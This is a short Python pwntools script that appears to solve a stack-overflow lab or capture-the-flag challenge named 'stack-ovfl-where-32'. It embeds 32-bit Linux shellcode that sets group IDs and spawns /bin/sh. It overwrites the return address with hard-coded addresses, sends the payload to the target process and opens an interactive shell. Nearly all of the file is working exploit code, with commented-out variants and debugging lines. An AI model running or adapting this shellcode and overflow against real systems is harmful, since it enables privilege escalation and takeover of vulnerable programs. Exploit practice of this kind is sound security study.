#! /usr/bin/env python
#read(0, -88, 0x100)

from pwn import *
import os
shellcode = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xdb1\xc91\xd2j\x0bXShn/shh//bi\x89\xe3\xcd\x80'
'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xdb1\xc9j\x0bXShn/shh//bi\x89\xe3\xcd\x80'
#'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xdb1\xc9j\x0bXShn/shh//bi\x89\xe3\xcd\x80'
#'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xdb1\xc9j\x0bXSjA\x89\xe3\xcd\x80'
#'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xdb1\xc9j\x0bXShn/shh//bi\x89\xe3\xcd\x80'
shellcode = shellcode + "\x90" * 4
print(len(shellcode))

filename = "./stack-ovfl-where-32"
#filename = "./stack-ovfl-where-xx"
#filename += shellcode

#src = "./stack-ovfl-no-envp-no-argv-32"
#if os.path.exists(src):
 #   print("EXISTS")
#os.symlink(src, filename)
p = process (filename)
#gdb.attach(p)

#buf = "A" * 0x88 + "A" * 4 + "BBBB"

#buf = shellcode
#buf += "A" * (0x88 + 4 - len(shellcode))
#buf += "BBBB"

buf =   shellcode   + p32(0x0804854d)+ p32(0xffffd4c2) #p32(0x804854c)
print(len(buf))
with open('a.txt', 'w') as f:
    f.write('%s\n' % buf)
    f.close


p.sendline(buf)
#p.wait()

#c = Core('core')

#buf_addr = c.stack.find(buf)
#print(hex(buf_addr))

#buf = "A" * 0x26
#buf += "A" * (0x88 + 4 - len(shellcode))
#buf += p32(shell_addr)

#p = process (filename)
#p.sendline(buf)
#p.wait()
p.interactive()


